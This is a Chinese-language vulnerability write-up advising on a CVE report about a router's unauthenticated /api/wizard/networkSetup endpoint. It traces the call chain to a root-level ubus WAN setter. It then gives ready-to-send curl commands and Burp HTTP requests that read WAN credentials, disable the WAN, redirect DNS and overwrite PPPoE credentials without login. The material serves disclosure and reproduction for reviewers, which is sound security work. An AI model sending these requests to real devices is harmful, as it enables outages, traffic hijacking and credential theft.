# `/api/wizard/networkSetup` 未授权改 WAN 配置分析指导与正式稿修改建议

## 1. 这份文档的用途

这份文档配套当前 CVE 目录中的正式稿：

- `report/preauth_wizard_networksetup_report.md`

目标是把这条漏洞的真实调用链、关键静态证据、以及正式稿里应补充的验证点一次讲清楚。

## 2. 一句话结论

这不是普通的“接口没鉴权”空泛描述，而是：

```text
POST /api/wizard/networkSetup
  -> /www/api main 按 PATH_INFO 先进入 /wizard 分支
  -> 在进入 /wizard 时尚未执行 FCGI_UserAuth
  -> wizard/networkSetup.lua 直接把请求映射成 esps.wan set
  -> ubus 后端以 root 权限修改 WAN 配置
```

因此本质是一个前置向导接口暴露出的未授权高危配置写入。

## 3. 关键静态证据

### 3.1 `/wizard` 路由发生在鉴权之前

`/www/api` 的 `main` 反编译结果显示：

- `0x402014`：读取 `PATH_INFO`
- `0x4021b8`：若路径以 `"/wizard"` 开头则进入 `FCGI_WizardProcess(...)`
- `0x402380`：之后才读取 `HTTP_AUTHENTICATION`
- `0x402394`：之后才调用 `FCGI_UserAuth(...)`

这说明 `/wizard/*` 请求走的是前置分支，而不是认证后的 `/esps` 分支。

### 3.2 `wizard` 框架按路径最后一段加载对应 Lua 模块

`/usr/lib/lua/wizard/wizard.lua`：

- 第 `3-9` 行：`find_cmd_method(cmd)` 通过 `strippath(cmd)` 取 URL 最后一段模块名

因此：

```text
/wizard/networkSetup -> networkSetup.lua
```

### 3.3 `networkSetup.lua` 直接映射到 `esps.wan set`

`/usr/lib/lua/wizard/networkSetup.lua`：

- 第 `4-8` 行：

```lua
ubus_cmd[1] ={ ["id"]=1,["path"]="esps.wan",["func"]="set",["args"]={["list"]={para}}, ["type"]=0 }
```

也就是说，前端向导请求不是单独实现一套低权限逻辑，而是直接转成高权限的 `esps.wan.set`。

### 3.4 `protol_cvt.lua` 负责真正的 ubus 调用

`/usr/lib/lua/protol_cvt.lua`：

- `50-56`：解析 `wizard` 模块返回的方法对象
- `77`：`find_ubus_cmd(...)`
- `89`：`ubus.connect()`
- `117`：`conn:call(v.path, v.func, v.args)`

这说明 `networkSetup.lua` 里的映射最终会落到 ubus 调用上。

### 3.5 读取接口同样可未授权回读修改结果

`/usr/lib/lua/wizard/getNetworkConf.lua`：

- `7-8`：分别调用 `esps.wan.status` 与 `esps.wan.get`
- `19-68`：把 `workMode/ip/submask/gwIp/dnsMaster/dnsSlave/user/pwd` 回传给前端

所以报告里最好加入“写入后再通过 `getNetworkConf` 无认证回读”的验证闭环。

## 4. 正式稿最应该补的点

### 4.1 把“未授权”写成完整数据流

不要只写：

- endpoint lacks authentication

而要明确写成：

- `/wizard` 分支在 `main` 中先于 `FCGI_UserAuth`
- `networkSetup.lua` 直接映射到 `esps.wan.set`
- 因而外部 HTTP 请求可在未登录状态下修改真实 WAN 配置

### 4.2 强化影响面

这条接口不仅能切换 DHCP / static / PPPoE / disabled，还能改：

- DNS
- 静态 IP / 网关
- PPPoE 用户名和密码

因此影响不仅是 DoS，也包括流量劫持和凭据替换。

### 4.3 加入“读回验证”和“恢复步骤”

正式稿里建议显式写出：

1. 先 `POST /api/wizard/getNetworkConf` 读基线；
2. 再未授权 `POST /api/wizard/networkSetup`；
3. 再次 `POST /api/wizard/getNetworkConf` 读回；
4. 最后恢复为原 WAN 模式。

这样审稿人更容易复核。

## 5. 建议补充到正式稿中的验证命令

```bash
curl -sS -X POST http://192.168.8.1/api/wizard/getNetworkConf \
  -H 'Content-Type: application/json' \
  --data '{}'
```

```bash
curl -sS -X POST http://192.168.8.1/api/wizard/networkSetup \
  -H 'Content-Type: application/json' \
  --data '{"intf":"WAN1","workMode":"disabled"}'
```

```bash
curl -sS -X POST http://192.168.8.1/api/wizard/getNetworkConf \
  -H 'Content-Type: application/json' \
  --data '{}'
```

恢复示例：

```bash
curl -sS -X POST http://192.168.8.1/api/wizard/networkSetup \
  -H 'Content-Type: application/json' \
  --data '{"intf":"WAN1","workMode":"dhcp"}'
```

## 6. 结论性写法建议

正式稿结论段建议围绕下面这句话展开：

> `/api/wizard/networkSetup` is reachable before session validation and is internally translated to the privileged ubus method `esps.wan.set`, allowing unauthenticated WAN reconfiguration.

## 7. BurpSuite 逐步复现

这条是 pre-auth，所以 Burp 里不需要先登录。

约定：

- 目标：`192.168.8.1`
- Burp Repeater 自动更新 `Content-Length`

### 7.1 包 1：读取当前 WAN 基线

```http
POST /api/wizard/getNetworkConf HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{}
```

记下返回里的：

- `workMode`
- `ip`
- `gwIp`
- `dnsMaster`
- `dnsSlave`
- 如果是 PPPoE，还可看 `user` / `pwd`

### 7.2 包 2：最小化复现，未授权把 WAN 改成 disabled

```http
POST /api/wizard/networkSetup HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"intf":"WAN1","workMode":"disabled"}
```

### 7.3 包 3：再次读回，确认未授权改写成功

```http
POST /api/wizard/getNetworkConf HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{}
```

预期现象：

- 返回中的 `data.workMode` 变成 `disabled`
- 整个过程没有 `AUTHENTICATION` 头

### 7.4 包 4：恢复到 DHCP

```http
POST /api/wizard/networkSetup HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"intf":"WAN1","workMode":"dhcp"}
```

### 7.5 可选包：证明还能未授权覆盖静态 IP / DNS

```http
POST /api/wizard/networkSetup HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"intf":"WAN1","workMode":"static","ip":"1.2.3.4","submask":"255.255.255.0","gwIp":"1.2.3.1","dnsMaster":"8.8.8.8","dnsSlave":"1.1.1.1","mtu":1500}
```

### 7.6 可选包：证明还能未授权覆盖 PPPoE 凭据

```http
POST /api/wizard/networkSetup HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"intf":"WAN1","workMode":"pppoe","user":"eviluser","pwd":"evilpass","dnsMaster":"9.9.9.9","dnsSlave":"4.4.4.4","mtu":1492}
```

发完后再用包 1 读回即可。
